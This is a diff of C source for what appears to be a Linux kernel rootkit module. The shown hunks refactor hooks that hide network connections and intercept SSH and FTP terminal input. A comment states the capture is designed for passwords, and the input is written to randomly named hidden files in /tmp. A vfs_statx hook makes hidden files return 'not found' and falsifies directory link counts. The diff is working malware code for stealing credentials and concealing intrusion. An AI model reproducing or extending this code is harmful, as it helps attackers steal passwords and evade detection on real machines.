@@ -628,7 +628,6 @@ static int m_udp4_seq_show(struct seq_file *seq, void *v)
 	return real_m_tcp4_seq_show(seq, v);
 }
 
-#pragma message "tcp6_seq_show untested"
 static int (*real_m_tcp6_seq_show)(struct seq_file *seq, void *v);
 static int m_tcp6_seq_show(struct seq_file *seq, void *v)
 {
@@ -644,7 +643,6 @@ static int m_tcp6_seq_show(struct seq_file *seq, void *v)
 	return real_m_tcp6_seq_show(seq, v);
 }
 
-#pragma message "udp6_seq_show untested"
 static int (*real_m_udp6_seq_show)(struct seq_file *seq, void *v);
 static int m_udp6_seq_show(struct seq_file *seq, void *v)
 {
@@ -821,7 +819,7 @@ static void __attribute__((unused)) _tty_dump(uid_t uid, pid_t pid, char *buf,
 }
 
 enum { R_NONE = 0, R_RETURN = 1, R_NEWLINE = 2, R_RANGE = 4 };
-static void _tty_write_log(uid_t uid, pid_t pid, char *buf, ssize_t len)
+static void _tty_write_log(uid_t uid, char *buf, ssize_t len)
 {
 	static loff_t offset;
 	struct timespec64 ts;
@@ -891,7 +889,7 @@ static int _key_update(uid_t uid, char byte, int flags)
 			node->buf[node->offset++] = '\n';
 			node->buf[node->offset] = 0;
 
-			_tty_write_log(uid, 0, node->buf, strlen(node->buf));
+			_tty_write_log(uid, node->buf, strlen(node->buf));
 
 			list_del(&node->list);
 			kfree(node);
@@ -994,15 +992,13 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 		flags |= (byte == '\n') ? R_NEWLINE : flags;
 
 		/**
-         * This implementation might appear a bit unconventional, but
-         * it's designed to handle SSH session data. The data typically
-         * arrives byte by byte, but there are instances when it comes
-         * as a multi-byte stream, for example, during password input.
-         * It's particularly tailored for handling passwords.
-         */
+		 * Handles SSH session data, which usually arrives one byte at a time.
+		 * However, in certain cases, such as during password input, the data may 
+		 * arrive as a multi-byte stream.
+		 */
 		if ((app_flag & APP_FTP) && rv > 1) {
 			ttybuf[strcspn(ttybuf, "\r")] = '\0';
-			_tty_write_log(uid, 0, ttybuf, sizeof(ttybuf));
+			_tty_write_log(uid, ttybuf, sizeof(ttybuf));
 
 		} else if (app_flag & APP_SSH &&
 			   (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
@@ -1056,6 +1052,7 @@ ftrace_get_regs(struct ftrace_regs *fregs)
 #endif
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
+#define __MAXLEN 256
 static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *,
 			      u32);
 static long m_vfs_statx(int dfd, const char __user *filename, int flags,
@@ -1068,39 +1065,49 @@ static long m_vfs_statx(int dfd, struct filename *filename, int flags,
 {
 #endif
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
-	char *name = kzalloc(PROCNAME_MAXLEN, GFP_KERNEL);
+	char *target = kzalloc(__MAXLEN, GFP_KERNEL);
 #else
-	char *name = filename ? filename->name : "";
+	const char *target = filename ? filename->name : "";
 #endif
 
 	/* call original first, I want stat */
 	long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
 
-	/** handle two distinct operations
-     *  1   If is directory, look for hidden file names
-     *      and update hard-links counter accordingly.
-     *  2   make stat fail for /proc interface.
+	/**
+     *  Return not found to userspace if target is present (file,dir),
+     *  otherwise count the number of hidden hard-links
+     *      and use it to decrement "Links:"
+     *  Check: if it can be optimized
      * */
-
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
-	if (name != NULL &&
-	    !copy_from_user((void *)name, filename, PROCNAME_MAXLEN - 1)) {
+	if (target != NULL &&
+	    !copy_from_user((void *)target, filename, __MAXLEN - 1)) {
 #endif
-		if (strlen(name) > 0 && S_ISDIR(stat->mode)) {
-			int count = fs_is_dir_inode_hidden((const char *)name,
-							   stat->ino);
+		const char *name = fs_get_basename(target);
+		if (fs_search_name(name, stat->ino)) {
+			rv = -ENOENT;
+			goto leave;
+		}
+
+		/* nothing found for this entry.
+         * Tamper 'nlink', if needed.
+         */
+		if (S_ISDIR(stat->mode)) {
+			int count = fs_is_dir_inode_hidden(stat->ino);
 			if (count > 0) {
 				prinfo("%s: file match ino=%llu nlink=%d count=%d\n",
 				       __func__, stat->ino, stat->nlink, count);
-
-				/* Hit(s) -> decrement hard-link counts */
 				stat->nlink -= count;
 			}
-		} else if (strstr(name, PROCNAME)) {
-			rv = -ENOENT;
 		}
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
-		kfree(name);
+	}
+#endif
+
+leave:
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
+	if (target != NULL) {
+		kfree(target);
 	}
 #endif
 	return rv;
@@ -1364,23 +1371,33 @@ struct sysfiles_t {
 	char sslfile[PATH_MAX];
 };
 static struct sysfiles_t sysfiles;
-static bool _sys_file_init(int ttymax, int sslmax)
+static bool _sys_file_init(void)
 {
 	bool rc = false;
+	char *tty, *ssl;
+	size_t min = 16, max = 64, len = 0;
+	u8 rnd = 0;
 
-	if (ttymax > 0 && sslmax > 0) {
-		char *tty = kv_util_random_AZ_string(ttymax);
-		char *ssl = kv_util_random_AZ_string(sslmax);
+	get_random_bytes(&rnd, sizeof(rnd));
+	len = min + (rnd % (max - min + 1));
+	tty = kv_util_random_AZ_string(len);
 
-		if (tty && ssl) {
-			snprintf(sysfiles.ttyfile, sizeof(sysfiles.ttyfile) - 1,
-				 "/var/.%s", tty);
-			snprintf(sysfiles.sslfile, sizeof(sysfiles.sslfile) - 1,
-				 "/tmp/.%s", ssl);
-			kv_mem_free(&tty, &ssl);
-			rc = true;
-		}
+	/** repeat */
+	get_random_bytes(&rnd, sizeof(rnd));
+	len = min + (rnd % (max - min + 1));
+	ssl = kv_util_random_AZ_string(len);
+
+	if (tty && ssl) {
+		snprintf(sysfiles.ttyfile, sizeof(sysfiles.ttyfile) - 1,
+			 "/tmp/.%s", tty);
+
+		snprintf(sysfiles.sslfile, sizeof(sysfiles.sslfile) - 1,
+			 "/tmp/.%s", ssl);
+		kv_mem_free(&tty, &ssl);
+
+		rc = true;
 	}
+
 	return rc;
 }
 
@@ -1397,7 +1414,7 @@ bool sys_init(void)
 {
 	int idx = 0, rc = false;
 
-	if (_sys_file_init(64, 64)) {
+	if (_sys_file_init()) {
 		char *tty = strrchr(sys_get_ttyfile(), '.');
 		char *ssl = strrchr(sys_get_sslfile(), '.');
 
